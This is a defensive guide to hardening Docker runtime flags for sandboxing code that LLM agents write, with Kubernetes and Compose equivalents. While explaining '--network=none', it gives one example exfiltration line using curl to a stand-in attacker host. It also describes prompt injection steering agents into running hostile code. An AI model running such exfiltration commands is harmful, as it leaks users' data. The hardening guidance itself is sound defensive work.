# Sandboxing LLM-agent-generated code with Docker

`dockerfiles/python/Dockerfile.sandbox` ships a tool-rich image for executing
code that an LLM agent has just written. The image is only half of the
sandbox — the other half is the `docker run` invocation. A non-root user with
a curated tool list is no defense if the container runs with the default
namespaces, default capabilities, and a writable rootfs. This guide is the
operational reference for the runtime side.

It documents the threat model, every hardening flag with rationale and the
cost of omitting it, how to feed input/output through the sandbox, network
egress patterns, time-bounding, audit, and equivalent manifests for
Kubernetes and Docker Compose. The flag examples here are
cross-checked against the recommended invocation in the header of
[`dockerfiles/python/Dockerfile.sandbox`](../dockerfiles/python/Dockerfile.sandbox);
if you change one, change the other.

## Threat model

**Defends against:**

- Agent-generated code that is **incorrect** (infinite loops, exhausting
  memory, fork bombs, deleting files it can reach, writing huge tmpfs).
- Agent-generated code that is **adversarial via prompt injection** — a third
  party slips instructions into the agent's input (a fetched web page, a
  README, a tool result) and steers the agent into executing hostile code.
  The sandbox keeps the blast radius local: no network exfil, no host file
  reads, no privilege escalation, no persistence.
- Curiosity-driven side-effects: the agent decides to "explore" by running
  `curl`, scanning the host, or reading `/etc/shadow`. None of that works
  from inside the sandbox.

**Does NOT defend against:**

- A **malicious host operator**. If you don't trust the operator running
  `docker`, container isolation is the wrong tool — they own the kernel.
- **Kernel 0-days** that let a process inside a container escape the
  namespace boundary. The Linux kernel is a shared trust boundary; for
  defense-in-depth against this, use a VM-based sandbox (Firecracker, Kata,
  a full VM) or a userspace kernel (gVisor / `runsc`). See
  [Hardening upgrade path](#hardening-upgrade-path).
- **Hardware side-channels** (Spectre, Meltdown class). Same answer:
  microVMs / separate physical hosts.
- **Supply-chain compromise of the agent itself** (a poisoned model weight,
  a tampered MCP server). The sandbox executes whatever the agent emits; it
  cannot tell "good code" from "the model was tricked into emitting bad
  code".

If your threat model includes any of the _does NOT_ items, stop and reach
for the [upgrade path](#hardening-upgrade-path) — a hardened Docker container
is not the right tool.

## The hardening flag stack

Each flag below is shown with **what it does**, **what it prevents**, and
**the cost of omitting it**. The combined recommended invocation is at
[Putting it together](#putting-it-together).

### `--read-only` and `--tmpfs /workspace:rw,exec,size=…,uid=10001,gid=10001`

- **What:** mounts the container's root filesystem read-only and provides a
  bounded writable tmpfs at `/workspace` owned by the agent user.
- **Prevents:** the agent overwriting its own binaries, dropping payloads
  into `/usr/local/bin`, persisting state across runs, or filling the host
  disk by writing to the container layer.
- **Cost of omitting:** any write the agent makes survives in the container
  layer until removal, the agent can replace `/usr/bin/python3` with a
  trojan, and there is no bounded budget on how much disk it can use.

A second small tmpfs at `/tmp` (`--tmpfs /tmp:rw,noexec,nosuid,size=64m`) is
recommended — many tools (`pip`, `git`, `pytest`) need `/tmp` writable.
`noexec,nosuid` prevents using `/tmp` as a launchpad.

### `--network=none`

- **What:** the container gets a network namespace with only `lo`, no veth
  pair, no DNS, no route to the host or internet.
- **Prevents:** data exfiltration, callbacks to a C2, package downloads at
  run time, scanning of the host's network.
- **Cost of omitting:** the agent can `curl evil.example.com/exfil?data=…`
  using any tool already in the image (or one it downloads).
- **When the agent legitimately needs egress:** create a user-defined docker
  network containing the sandbox **and** an MCP gateway sidecar, and
  give _only_ the gateway a route to the outside. See
  [Network egress patterns](#network-egress-patterns).

### `--cap-drop=ALL`

- **What:** drops every Linux capability. Combined with non-root, the
  process inside has roughly the privileges of an unprivileged user with
  no setuid binaries available.
- **Prevents:** binding to ports < 1024, raw sockets, mount/umount,
  capability-based privilege escalation paths.
- **Cost of omitting:** Docker grants a default set of capabilities
  (`CAP_NET_RAW`, `CAP_AUDIT_WRITE`, etc.) that the sandbox doesn't need.
  Each unnecessary capability is one more lever for a kernel exploit.

### `--security-opt=no-new-privileges`

- **What:** sets the `no_new_privs` bit on the process and its descendants —
  setuid binaries and file capabilities can no longer elevate privileges.
- **Prevents:** the classic post-exploitation path of finding a setuid
  binary (or a file with `CAP_SETUID`) and using it to become root within
  the namespace.
- **Cost of omitting:** an unpatched setuid binary in the base image
  becomes a privilege-escalation primitive even though the agent started
  as non-root.

### `--security-opt=seccomp=…`

- **What:** filters which syscalls the kernel will accept from the process.
  Docker's **default profile** blocks ~44 syscalls (e.g. `mount`,
  `reboot`, `kexec_load`, `bpf`, `ptrace` against other PIDs) that are
  reachable through capabilities the container doesn't have — and a long
  tail of obscure syscalls that have been the source of past CVEs.
- **Prevents:** large classes of kernel-attack surface. Even if a kernel
  bug exists in (say) `add_key`, the agent can't reach it.
- **Cost of omitting (`--security-opt seccomp=unconfined`):** the full
  syscall surface is exposed. This is a real regression — do not disable
  the default profile unless something concretely needs it (and then
  produce a custom profile that opens only that syscall).
- **Custom profiles:** start from the
  [Docker default profile](https://github.com/moby/moby/blob/master/profiles/seccomp/default.json)
  and remove syscalls the sandbox provably doesn't need (`clone3`,
  `setns`, `unshare` if you don't need nested containers).

### AppArmor / SELinux

- **What:** Linux MAC layered on top of DAC/capabilities.
  `--security-opt=apparmor=docker-default` enables the default AppArmor
  profile (Ubuntu, Debian); on SELinux hosts (RHEL, Fedora),
  `--security-opt=label=…` selects an SELinux type.
- **Prevents:** access to paths and operations the profile denies even
  when DAC would allow them.
- **Cost of omitting:** AppArmor/SELinux is usually applied automatically
  on hosts that enforce it; explicitly setting the flag makes the policy
  visible in the run command and prevents accidental
  `--security-opt apparmor=unconfined` in copy-pasted invocations.

### `--memory`, `--cpus`, `--pids-limit`, `--ulimit nofile`, `--ulimit nproc`

- **What:** cgroup-enforced caps on RAM, CPU shares, process count, open
  files, and (per-user) processes.
- **Prevents:** runaway loops (`--cpus`), memory bombs
  (`--memory=512m` + OOM kill), fork bombs (`--pids-limit=256`), file
  descriptor exhaustion (`--ulimit nofile=1024:1024`).
- **Cost of omitting:** a single misbehaving agent can take down the host.
  This is the #1 thing that goes wrong in practice — much more common
  than a sandbox escape.

Tune from observed workloads. Defaults that work for most agent tasks:
`--memory=512m --cpus=1 --pids-limit=256 --ulimit nofile=1024:1024`.

### `--user 10001:10001`

- **What:** runs the entrypoint as UID:GID 10001 explicitly, overriding
  whatever the image's `USER` line says.
- **Prevents:** running as root if the image is later edited to drop the
  `USER agent` line, and makes the UID match the `uid=10001` on the tmpfs
  mount so the agent can actually write to `/workspace`.
- **Cost of omitting:** the image's `USER` line is necessary but not
  sufficient — anyone deriving from this image can add a later `USER
root` and the host has no way to know. Setting `--user` on the host
  side is belt-and-braces.

### `--ipc=private`, `--uts=private`

- **What:** private IPC and UTS namespaces (the defaults for plain `docker
run`, but worth being explicit about when sharing namespaces is on the
  table).
- **Prevents:** shared System V IPC / POSIX shared memory with other
  containers (`--ipc=host` or `--ipc=container:other` would expose it);
  the agent setting a hostname that another process trusts.
- **Cost of omitting:** only matters if you were considering sharing
  namespaces — then _don't_, explicitly.

### `--device-cgroup-rule`

- **What:** the device cgroup controls which device nodes the container
  can access. By default Docker allows a small set
  (`/dev/null`, `/dev/zero`, `/dev/random`, `/dev/urandom`, `/dev/tty`,
  `/dev/console`, `/dev/ptmx`).
- **Prevents:** accidentally exposing GPUs, raw block devices, or
  `/dev/kmsg` via `--device` flags. To explicitly deny all devices except
  the small default set, use `--device-cgroup-rule='c *:* rmw'` _only_
  for the devices you want.
- **Cost of omitting:** you only need this if you're also using
  `--device` or `--privileged` (you should not be using `--privileged` —
  it disables almost every protection on this page).

## Input / output channels

The sandbox is sealed by default. Get data in and out via:

- **Read-only bind mount for input** — `--mount
type=bind,src="$PWD/task",dst=/work-input,readonly`. The agent reads
  from `/work-input/…` and cannot write to it. **Do NOT bind-mount over
  `/workspace`** — that shadows the writable tmpfs and leaves the agent
  with no writable directory.
- **Writable tmpfs for scratch output** — `/workspace` is already an
  ephemeral tmpfs. Anything written there vanishes when the container
  exits, which is usually what you want for agent scratch.
- **A separate writable volume for output you want to keep** — `--mount
type=volume,src=agent-output,dst=/out` (the volume only mounts at
  `/out`, the rest stays read-only). Or `--mount
type=bind,src="$PWD/out",dst=/out` if you want it on the host
  filesystem directly.
- **`docker cp` for one-shot ferrying** — `docker cp ./task.py
<container>:/workspace/task.py` after the container starts. Works even
  with `--network=none`, no shared mount required.
- **`stdin` / `stdout` for piped invocations** — `docker run -i …
python-sandbox python - < script.py` pipes the script in on stdin;
  capture results from the container's stdout. Best when the agent's
  work is "one expression, one answer".

## Network egress patterns

Ordered from most-isolated to least-isolated:

1. **No network (`--network=none`)** — the default. Use this whenever the
   task can be expressed as "compute on this input, return output". Most
   code-execution tasks fit here.
2. **MCP-gateway-only network** — create a user-defined docker network and
   attach two containers to it: the sandbox (no other network) and an MCP
   gateway sidecar that _does_ have outside connectivity but exposes only
   a scoped tool API. The agent can call the gateway over the internal
   network, the gateway enforces "fetch this URL", "query this DB", and
   the sandbox itself still has no path to the internet.

   ```sh
   docker network create --internal agent-net   # --internal blocks NAT egress
   docker run -d --name mcp-gateway --network agent-net … mcp-gateway:latest
   docker run --rm -it \
     --network agent-net \
     [other hardening flags] \
     python-sandbox
   ```

   `--internal` on the network is the load-bearing flag — it prevents the
   docker bridge from NATing traffic out. The gateway gets external
   connectivity through a _second_ network attachment or by being on a
   different (non-`--internal`) network.

3. **Full network with egress policy** — attach a normal docker network
   and enforce egress at the host firewall / iptables / a proxy sidecar
   (`HTTP_PROXY=http://egress-proxy:3128`). Weakest of the three; use
   only when (2) is infeasible.

## Time-bounding execution

Three layers, use all of them:

- **In-container** — wrap the command with `timeout(1)`:
  `docker run … python-sandbox timeout 30 python script.py`. Cheap, kills
  the inner process at the wall-clock budget.
- **Container stop** — `docker run --stop-timeout=5 …` controls how long
  `docker stop` waits between `SIGTERM` and `SIGKILL`. Pair with an
  external `docker stop <id>` after the task budget.
- **External / API** — from a controller process, use the Docker Engine
  API to call `POST /containers/{id}/stop?t=5` (or `…/kill`) on a timer.
  Required if the agent's task spawns subprocesses that escape `timeout`.

## Audit and forensics

- **Capture stdout/stderr** unconditionally — `docker logs <id>` is
  available after exit if you didn't use `--rm`; or pipe at run time with
  `docker run … 2>&1 | tee run.log`.
- **Structured logs** beat free-text. If the agent's harness emits JSON
  events (`{"step": …, "tool": …, "args": …}`) to stdout, you get an
  auditable replay for free.
- **Read-only rootfs guarantee** — after a misbehaving run, the
  container's rootfs is exactly the image's rootfs. Any state the agent
  wrote is in `/workspace` (tmpfs, gone) or your output volume. Nothing
  hides in `/var/cache` or `/usr/local`.
- **Log drivers** — for production, `--log-driver=journald` (host
  journal), `--log-driver=fluentd`, `--log-driver=awslogs`, etc., ship
  every container's stdout/stderr to a central store without per-run
  plumbing.

## Putting it together

The complete invocation, matching
[`dockerfiles/python/Dockerfile.sandbox`](../dockerfiles/python/Dockerfile.sandbox):

```sh
docker run --rm -it \
  --read-only \
  --tmpfs /workspace:rw,exec,size=256m,uid=10001,gid=10001 \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --network=none \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt=seccomp=/etc/docker/seccomp/default.json \
  --security-opt=apparmor=docker-default \
  --user 10001:10001 \
  --ipc=private --uts=private \
  --memory=512m --cpus=1 \
  --pids-limit=256 \
  --ulimit nofile=1024:1024 \
  --stop-timeout=5 \
  python-sandbox
```

(`--security-opt=seccomp=…` is shown explicitly; omitting the flag uses
Docker's built-in default, which is also fine. The path above is
illustrative — Docker ships the default profile compiled in, not as a
file.)

## Orchestrator integration

### Kubernetes

End-to-end Pod manifest equivalent — copy-pasteable:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: agent-sandbox
spec:
  restartPolicy: Never
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: sandbox
      image: python-sandbox:latest
      command: ["timeout", "30", "python", "/work-input/script.py"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        runAsUser: 10001
        capabilities:
          drop: ["ALL"]
      resources:
        limits:
          memory: "512Mi"
          cpu: "1"
        requests:
          memory: "256Mi"
          cpu: "500m"
      volumeMounts:
        - name: workspace
          mountPath: /workspace
        - name: tmp
          mountPath: /tmp
        - name: input
          mountPath: /work-input
          readOnly: true
  volumes:
    - name: workspace
      emptyDir:
        medium: Memory
        sizeLimit: 256Mi
    - name: tmp
      emptyDir:
        medium: Memory
        sizeLimit: 64Mi
    - name: input
      configMap:
        name: agent-task
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-sandbox-deny-egress
spec:
  podSelector:
    matchLabels: { app: agent-sandbox }
  policyTypes: ["Egress"]
  egress: [] # empty list = deny all
```

This matches the
[restricted Pod Security Standard](https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted)
and adds:

- `emptyDir.medium: Memory` — tmpfs-backed `/workspace`, equivalent to
  `--tmpfs`.
- Explicit `NetworkPolicy` with empty `egress` — `--network=none`
  equivalent. Requires a CNI that enforces NetworkPolicy (Calico,
  Cilium, etc.); flannel does not.
- `automountServiceAccountToken: false` — the agent doesn't need
  Kubernetes API access; don't give it credentials by default.

### Docker Compose

```yaml
services:
  sandbox:
    image: python-sandbox:latest
    read_only: true
    network_mode: "none"
    user: "10001:10001"
    cap_drop: ["ALL"]
    security_opt:
      - "no-new-privileges:true"
      - "seccomp:default"
    pids_limit: 256
    mem_limit: 512m
    cpus: 1.0
    ipc: private
    tmpfs:
      - /workspace:rw,exec,size=256m,uid=10001,gid=10001
      - /tmp:rw,noexec,nosuid,size=64m
    ulimits:
      nofile: { soft: 1024, hard: 1024 }
    stop_grace_period: 5s
```

### Lambda / Cloud Run / ECS Fargate

Managed runtimes constrain you somewhat by default, but **never** to the
level of the full flag stack above. Treat them as a starting point, not
a finish line.

| Platform        | Already enforced                                                                       | Still your responsibility                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| **AWS Lambda**  | Read-only `/var/task`, ephemeral `/tmp`, no host, Firecracker microVM, no docker flags | Set memory; no fine-grained capability or seccomp control; egress = VPC config; networking is `internet` unless attached to a private VPC. |
| **Cloud Run**   | gVisor-isolated, ephemeral, non-root if image is non-root                              | `--no-cpu-throttling`, memory, max-instances; egress via VPC connector or `--vpc-egress=all-traffic`.                                      |
| **ECS Fargate** | Non-root if image is non-root, read-only rootfs if you ask, isolated microVM           | `readonlyRootFilesystem: true` in task def; `linuxParameters.capabilities.drop: ["ALL"]`; `linuxParameters.initProcessEnabled` for tini.   |

None of these give you `--network=none` for free — egress is the trap.
Apply the platform's networking primitive (Lambda VPC config + no NAT
gateway; Cloud Run VPC egress + Cloud Armor; Fargate task in private
subnet with no NAT) to get the equivalent of network-deny.

## What the sandbox does NOT solve

A reminder of the threat-model limits — easy to lose sight of in the
middle of a flag-stack victory lap:

- **Side-channel exfiltration.** Timing channels, cache attacks, DNS-via-
  systemd-resolved tricks — none of these are stopped by capability drop
  or seccomp. If your data is worth exfiltrating via Spectre, you need
  VM-level isolation, not container hardening.
- **Host kernel CVEs.** The container shares the host kernel. A privilege
  escalation in (say) `io_uring` is reachable from a fully locked-down
  container. Patch the host; don't depend on container isolation as the
  last line of defense against kernel bugs.
- **Supply-chain compromise of the agent.** If the model weights or the
  prompt-routing layer are tampered with, the agent will emit _whatever
  the attacker wants_ and the sandbox will dutifully run it within the
  blast radius the sandbox allows. The sandbox bounds the damage; it
  does not detect that the agent has been hijacked.

## Hardening upgrade path

When the threat model needs more than a hardened container can offer:

| Option                               | What you get                                                                                                                            | When to use                                                                                               |
| ------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **gVisor / runsc**                   | A userspace re-implementation of the Linux syscall surface; container-shaped, but the agent's syscalls hit gVisor, not the host kernel. | Multi-tenant code execution where kernel CVE surface is the main worry. Cloud Run uses this.              |
| **Kata Containers**                  | Each container runs in its own lightweight VM; OCI-compatible from above.                                                               | You want VM isolation but keep your Kubernetes / OCI tooling.                                             |
| **Firecracker microVMs**             | Minimal VMM (~5 MB) booting a stripped Linux kernel per workload; ~125 ms cold start.                                                   | Bespoke harness; what Lambda and Fly.io use under the hood. Best perf/isolation tradeoff for code-exec.   |
| **Full VM** (QEMU, Cloud Hypervisor) | Strongest isolation, slowest startup, largest footprint.                                                                                | Long-lived agent workspaces, multi-process state, or compliance regimes that mandate VM-level boundaries. |

A practical sequencing: start with the hardened-Docker setup in this doc.
Move to gVisor (drop-in: `--runtime=runsc` on Docker, runtime class on
Kubernetes) when you start running untrusted code at scale and the
shared-kernel surface becomes a concern. Move to Firecracker / Kata when
isolation is a customer-facing requirement, not just a defense-in-depth
preference.

## References

- [Docker security overview](https://docs.docker.com/engine/security/)
- [Docker default seccomp profile](https://github.com/moby/moby/blob/master/profiles/seccomp/default.json)
- [Kubernetes Pod Security Standards — restricted](https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted)
- [gVisor](https://gvisor.dev/)
- [Firecracker microVMs](https://github.com/firecracker-microvm/firecracker)
- [Kata Containers](https://katacontainers.io/)
- The recommended invocation block in
  [`dockerfiles/python/Dockerfile.sandbox`](../dockerfiles/python/Dockerfile.sandbox).
